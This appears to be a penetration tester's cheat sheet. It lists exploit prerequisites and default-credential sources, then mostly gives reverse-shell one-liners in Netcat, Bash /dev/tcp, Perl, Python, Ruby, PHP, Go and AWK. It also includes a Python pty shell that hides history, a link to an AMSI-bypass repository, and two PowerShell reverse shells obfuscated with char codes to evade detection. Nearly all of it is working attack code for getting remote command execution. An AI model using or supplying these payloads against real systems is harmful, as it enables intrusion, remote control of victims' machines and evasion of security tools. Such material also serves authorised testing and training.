# Pre-requisites for runninging exploits
- Check the version of the operating system.
- Check the software version.
- Check if there is exploit for it (Searchsploit, ExploitDB, Google, etc).
- If you have an exploit, is there a Metasploit Module for it?
# Default Credentials
- https://cirt.net/passwords
- https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
# Reverse Shells
## Sources/Links
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://highon.coffee/blog/reverse-shell-cheat-sheet/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md
- Amsi-Bypass-Powershell: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
- https://github.com/m0rph-1/revshellgen (tool for generating rev shells)

## Most commonly used:
- Netcat: `nc -e /bin/sh 10.0.0.1 1234`
    - when -e is and is not available: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
- Bash: `bash -i >& /dev/tcp/IP ADDRESS/8080 0>&1`
- Perl: `perl -e 'use Socket;$i="IP ADDRESS";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
- Python
    - One Liner: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP ADDRESS",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
    - Script: Can add to libraries if you have access to edit the libraries. Full source of resources can be found here: https://github.com/infodox/python-pty-shells
        `import os
        import pty
        import socket
        lhost = "192.168.119.111"
        lport = 80
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((lhost, lport))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        os.putenv("HISTFILE",'/dev/null')
        pty.spawn("/bin/bash")
        s.close()`
    - IPv6: `python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' `
- Ruby: `ruby -rsocket -e'f=TCPSocket.open("IP ADDRESS",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
- Ruby: `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`
- PHP - http://pentestmonkey.net/tools/web-shells/php-reverse-shell
- PHP (local): `/usr/share/webshells/php/php-reverse-shell.php`
- PHP `php -r '$sock=fsockopen("IP ADDRESS",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
- Windows Powershell Oneliner
    - Note: To change the IP Address replace the number values in Check.for.Callback.Connection. To change the port pick your own numeric values to equal the number you want your shell to callback to you.

    `$ezYSZf = & ((Get-Command "New-ScheduledJobOption").name[0,1,2,3,14,15,13,1,5,18] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})("Check.for.Callback.Connection".Replace("Check",127).Replace("For",0+255-255).Replace("Callback", 0+234-234).Replace("Connection",0+0+0+1),(443*2-443));
    $VXm = $ezYSZf.GetStream();
    [byte[]]$0bLXRjHKPvWQUhq = (10023-10023)..(13107*5)|<##>%{$_}<##>|%{0};
    while(($i = $VXm.Read($0bLXRjHKPvWQUhq, 0, $0bLXRjHKPvWQUhq.Length)) -ne 0)
    {;
    $Tc9dYRLI5 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($0bLXRjHKPvWQUhq,0, $i);
    $sendback = (iex $Tc9dYRLI5 2>&1 |<##>%{$_}<##>| Out-String );
    $YzlnHIRT = $sendback + $(([string]::join('', ( (80,83,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})) + (pwd).Path + $(([string]::join('', ( (62,62,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_}));
    $sdfghjklASDA222 = ([text.encoding]::ASCII).GetBytes($YzlnHIRT);
    $VXm.Write($sdfghjklASDA222,0,$sdfghjklASDA222.Length);$VXm.Flush()
    };
    Start-Sleep -Seconds 5
    $ezYSZf.Close()`

# Windows Resources
- Powershell: `/usr/share/nishang/Shells`

- Linux Powershell Oneliner
    `$ezYSZf = & (("New-ScheduledJobOption")[0,1,2,3,14,15,13,1,5,18] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})("Stay.Off.Ronins.Lawn".Replace("Stay",127).Replace("Off",0+255-255).Replace("Ronins", 0+1-1).Replace("Lawn",0+0+0+1),(443*2-443));
    $VXm = $ezYSZf.GetStream();
    [byte[]]$0bLXRjHKPvWQUhq = (10023-10023)..(13107*5)|<##>%{$_}<##>|%{0};
    while(($i = $VXm.Read($0bLXRjHKPvWQUhq, 0, $0bLXRjHKPvWQUhq.Length)) -ne 0)
    {;
    $Tc9dYRLI5 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($0bLXRjHKPvWQUhq,0, $i);
    $sendback = (iex $Tc9dYRLI5 2>&1 |<##>%{$_}<##>| Out-String );
    $YzlnHIRT = $sendback + $(([string]::join('', ( (80,83,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})) + (pwd).Path + $(([string]::join('', ( (62,62,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_}));
    $sdfghjklASDA222 = ([text.encoding]::ASCII).GetBytes($YzlnHIRT);
    $VXm.Write($sdfghjklASDA222,0,$sdfghjklASDA222.Length);$VXm.Flush()
    };
    $ezYSZf.Close()`
- Golang: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IP ADDRESS:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`
- AWK: `awk 'BEGIN {s = "/inet/tcp/0/IP ADDRESS/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`